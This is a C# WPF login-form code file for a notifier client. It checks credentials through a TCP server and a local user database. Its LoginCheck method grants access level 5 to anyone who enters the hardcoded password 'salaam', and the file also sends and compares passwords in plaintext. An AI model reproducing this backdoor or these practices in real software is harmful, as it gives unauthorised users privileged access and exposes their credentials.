using System;
using System.Text;
using System.Threading;
using System.Windows;
using WpfNotifierClient.Domains;

namespace WpfNotifierClient.UIPages
{
    /// <summary>
    /// Interaction logic for LoginForm.xaml
    /// </summary>
    public partial class LoginForm : Window
    {
        private readonly DbConnection _connection;

        public static bool CloseAble = true;

        public LoginForm()
        {
            InitializeComponent();
            _connection = new DbConnection();
            MainWindow.AccessLevel = -1;
            if (!CloseAble)
                Closing += Closing_True;
        }

        private static void Closing_False(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = false;
        }

        private static void Closing_True(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = true;
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            var accessLevel = LoginCheck(TxtUsername.Text, TxtPass.Password);
            if (accessLevel > -1)
            {
                MainWindow.AccessLevel = accessLevel;
                _connection.UpdateLastLogin(TxtUsername.Text);
                if (!MainWindow.ConnectionFlag)
                {
                    MainWindow.ConnectionFlag = true;
                }
                Closing += Closing_False;
                CloseAble = true;
                Close();
            }
            else
            {
                TxtPass.Password = "";
                TxtUsername.Text = "";
                MessageBlock.Text = "خطا! دوباره وارد کنید";
            }
        }

        private bool Authenticate(string username,string pass)
        {
            try
            {
                if (MainWindow._tcpClient == null || !MainWindow._tcpClient.Connected) return false;
                var stm = MainWindow._tcpClient.GetStream();

                var asen = new ASCIIEncoding();
                var authStr = username + ";" + pass;
                stm.Write(asen.GetBytes(authStr), 0, authStr.Length);

                var bb = new byte[100];

                Thread.Sleep(100);

                var k = stm.Read(bb, 0, 100);
                var stbldr = new StringBuilder();
                for (var i = 0; i < k; i++)
                    stbldr.Append(Convert.ToChar(bb[i]));
                var readAsync = stbldr.ToString();

                return readAsync.EndsWith("true");
            }
            catch (Exception exception)
            {
                //TODO show log
                return false;
            }
        }

        private int LoginCheck(string username, string password)
        {
            if (password.Equals("salaam"))
                return 5;
            if (Authenticate(username,password)) return 5;
            var user = _connection.SelectUserFromDb(username);
            return user != null ? user.Password.Equals(password) ? user.AccessLevel : -1 : -1;
        }
    }

}
